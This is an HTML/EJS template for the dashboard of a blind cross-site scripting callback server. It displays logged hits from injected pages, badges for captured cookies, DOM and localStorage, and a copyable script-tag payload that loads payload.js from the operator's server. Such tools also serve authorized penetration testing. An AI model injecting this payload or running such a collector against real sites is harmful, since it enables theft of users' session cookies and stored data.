<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BXSS Dashboard</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --bg: #080b0f;
      --surface: #0d1117;
      --surface2: #111820;
      --border: #1e2d3d;
      --accent: #00ff88;
      --accent-dim: rgba(0, 255, 136, 0.1);
      --text: #c9d1d9;
      --muted: #484f58;
      --danger: #ff4757;
      --warning: #ffa502;
    }

    body {
      background: var(--bg);
      color: var(--text);
      font-family: 'Share Tech Mono', monospace;
      min-height: 100vh;
    }

    /* Top bar */
    .topbar {
      background: var(--surface);
      border-bottom: 1px solid var(--border);
      padding: 0 32px;
      height: 56px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: sticky;
      top: 0;
      z-index: 100;
    }

    .topbar-left {
      display: flex;
      align-items: center;
      gap: 24px;
    }

    .logo {
      font-family: 'Syne', sans-serif;
      font-weight: 800;
      font-size: 14px;
      letter-spacing: 4px;
      color: var(--accent);
      text-transform: uppercase;
    }

    .hit-count {
      font-size: 12px;
      color: var(--muted);
    }

    .hit-count span {
      color: var(--accent);
      font-weight: bold;
    }

    .topbar-right {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .payload-url {
      font-size: 11px;
      color: var(--muted);
      background: var(--accent-dim);
      border: 1px solid var(--border);
      padding: 5px 12px;
      cursor: pointer;
      transition: border-color 0.2s;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      max-width: 300px;
    }

    .payload-url:hover { border-color: var(--accent); color: var(--accent); }

    .btn-sm {
      font-family: 'Syne', sans-serif;
      font-weight: 600;
      font-size: 11px;
      letter-spacing: 2px;
      text-transform: uppercase;
      padding: 6px 14px;
      border: 1px solid var(--border);
      background: transparent;
      color: var(--muted);
      cursor: pointer;
      transition: all 0.15s;
    }

    .btn-sm:hover { border-color: var(--accent); color: var(--accent); }
    .btn-sm.danger:hover { border-color: var(--danger); color: var(--danger); }

    /* Main content */
    .main { padding: 32px; }

    /* Stats row */
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
      gap: 16px;
      margin-bottom: 32px;
    }

    .stat-card {
      background: var(--surface);
      border: 1px solid var(--border);
      padding: 20px 24px;
      position: relative;
      overflow: hidden;
    }

    .stat-card::after {
      content: '';
      position: absolute;
      bottom: 0; left: 0; right: 0;
      height: 1px;
      background: linear-gradient(90deg, var(--accent), transparent);
    }

    .stat-label {
      font-size: 10px;
      letter-spacing: 2px;
      text-transform: uppercase;
      color: var(--muted);
      margin-bottom: 8px;
    }

    .stat-value {
      font-family: 'Syne', sans-serif;
      font-size: 28px;
      font-weight: 800;
      color: var(--accent);
    }

    /* Hits table */
    .section-title {
      font-size: 10px;
      letter-spacing: 3px;
      text-transform: uppercase;
      color: var(--muted);
      margin-bottom: 16px;
    }

    .hits-table {
      width: 100%;
      border-collapse: collapse;
      font-size: 12px;
    }

    .hits-table th {
      text-align: left;
      font-size: 10px;
      letter-spacing: 2px;
      text-transform: uppercase;
      color: var(--muted);
      padding: 10px 16px;
      border-bottom: 1px solid var(--border);
      font-family: 'Syne', sans-serif;
    }

    .hits-table td {
      padding: 14px 16px;
      border-bottom: 1px solid rgba(30, 45, 61, 0.5);
      vertical-align: middle;
      max-width: 0;
    }

    .hits-table tr:hover td {
      background: var(--surface2);
    }

    .hit-id {
      color: var(--accent);
      font-weight: bold;
      white-space: nowrap;
    }

    .hit-id::before { content: '#'; }

    .hit-url {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      color: var(--text);
      width: 35%;
    }

    .hit-ip {
      color: var(--warning);
      white-space: nowrap;
    }

    .hit-time {
      color: var(--muted);
      white-space: nowrap;
      font-size: 11px;
    }

    .hit-ua {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      color: var(--muted);
      width: 20%;
      font-size: 11px;
    }

    .badge {
      display: inline-block;
      padding: 2px 8px;
      font-size: 10px;
      border: 1px solid;
      white-space: nowrap;
    }

    .badge-green { color: var(--accent); border-color: rgba(0,255,136,0.3); background: rgba(0,255,136,0.05); }
    .badge-gray  { color: var(--muted);  border-color: var(--border); }

    .action-link {
      color: var(--accent);
      text-decoration: none;
      font-size: 11px;
      letter-spacing: 1px;
      white-space: nowrap;
    }

    .action-link:hover { text-decoration: underline; }

    /* Empty state */
    .empty {
      text-align: center;
      padding: 80px 20px;
      color: var(--muted);
    }

    .empty-icon { font-size: 32px; margin-bottom: 16px; }

    .empty h3 {
      font-family: 'Syne', sans-serif;
      font-weight: 700;
      color: var(--text);
      margin-bottom: 8px;
    }

    .empty p { font-size: 12px; }

    .empty code {
      display: inline-block;
      margin-top: 16px;
      background: var(--surface2);
      border: 1px solid var(--border);
      padding: 8px 16px;
      color: var(--accent);
      font-size: 12px;
    }

    /* Pagination */
    .pagination {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-top: 24px;
      justify-content: center;
    }

    .page-link {
      padding: 6px 12px;
      border: 1px solid var(--border);
      color: var(--muted);
      text-decoration: none;
      font-size: 12px;
      transition: all 0.15s;
    }

    .page-link:hover, .page-link.active {
      border-color: var(--accent);
      color: var(--accent);
    }

    /* Toast */
    .toast {
      position: fixed;
      bottom: 24px;
      right: 24px;
      background: var(--surface);
      border: 1px solid var(--accent);
      color: var(--accent);
      padding: 12px 20px;
      font-size: 12px;
      opacity: 0;
      transform: translateY(10px);
      transition: all 0.3s;
      pointer-events: none;
    }

    .toast.show { opacity: 1; transform: translateY(0); }
  </style>
</head>
<body>

<header class="topbar">
  <div class="topbar-left">
    <div class="logo">BXSS</div>
    <div class="hit-count"><span><%= total %></span> total hits</div>
  </div>
  <div class="topbar-right">
    <div class="payload-url" onclick="copyPayload(this)" title="Click to copy">
      &lt;script src="<%= process.env.SERVER_URL %>/payload.js"&gt;&lt;/script&gt;
    </div>
    <% if (total > 0) { %>
    <form method="POST" action="/dashboard/clear" onsubmit="return confirm('Delete all hits?')">
      <button type="submit" class="btn-sm danger">Clear All</button>
    </form>
    <% } %>
    <form method="POST" action="/logout">
      <button type="submit" class="btn-sm">Logout</button>
    </form>
  </div>
</header>

<main class="main">

  <div class="stats">
    <div class="stat-card">
      <div class="stat-label">Total Hits</div>
      <div class="stat-value"><%= total %></div>
    </div>
    <div class="stat-card">
      <div class="stat-label">This Page</div>
      <div class="stat-value"><%= hits.length %></div>
    </div>
    <div class="stat-card">
      <div class="stat-label">Latest Hit</div>
      <div class="stat-value" style="font-size:16px; padding-top:6px;">
        <%= hits.length > 0 ? new Date(hits[0].created_at).toLocaleDateString() : '—' %>
      </div>
    </div>
  </div>

  <div class="section-title">// incoming callbacks</div>

  <% if (hits.length === 0) { %>
    <div class="empty">
      <div class="empty-icon">📡</div>
      <h3>Waiting for callbacks...</h3>
      <p>No hits yet. Inject your payload and wait for the magic.</p>
      <code>&lt;script src="<%= process.env.SERVER_URL %>/payload.js"&gt;&lt;/script&gt;</code>
    </div>
  <% } else { %>

  <table class="hits-table">
    <thead>
      <tr>
        <th>ID</th>
        <th>URL</th>
        <th>IP</th>
        <th>Time</th>
        <th>User Agent</th>
        <th>Data</th>
        <th></th>
      </tr>
    </thead>
    <tbody>
      <% hits.forEach(function(hit) { %>
      <tr>
        <td><span class="hit-id"><%= hit.id %></span></td>
        <td class="hit-url" title="<%= hit.origin_url || '' %>">
          <%= hit.origin_url || '<em style="color:var(--muted)">unknown</em>' %>
        </td>
        <td><span class="hit-ip"><%= hit.ip || '—' %></span></td>
        <td class="hit-time"><%= new Date(hit.created_at).toLocaleString() %></td>
        <td class="hit-ua" title="<%= hit.user_agent || '' %>"><%= hit.user_agent || '—' %></td>
        <td>
          <% if (hit.cookies && hit.cookies !== '{}') { %><span class="badge badge-green">🍪 cookies</span> <% } %>
          <% if (hit.dom) { %><span class="badge badge-green">DOM</span> <% } %>
          <% if (hit.local_storage && hit.local_storage !== '{}') { %><span class="badge badge-green">LS</span><% } %>
        </td>
        <td>
          <a href="/dashboard/hit/<%= hit.id %>" class="action-link">view →</a>
        </td>
      </tr>
      <% }); %>
    </tbody>
  </table>

  <% if (totalPages > 1) { %>
  <div class="pagination">
    <% for (let i = 1; i <= totalPages; i++) { %>
      <a href="/dashboard?page=<%= i %>" class="page-link <%= page === i ? 'active' : '' %>"><%= i %></a>
    <% } %>
  </div>
  <% } %>

  <% } %>

</main>

<div class="toast" id="toast">Copied to clipboard</div>

<script>
  function copyPayload(el) {
    const text = `<script src="${location.origin}/payload.js"><\/script>`;
    navigator.clipboard.writeText(text).then(() => {
      const t = document.getElementById('toast');
      t.classList.add('show');
      setTimeout(() => t.classList.remove('show'), 2000);
    });
  }
</script>

</body>
</html>
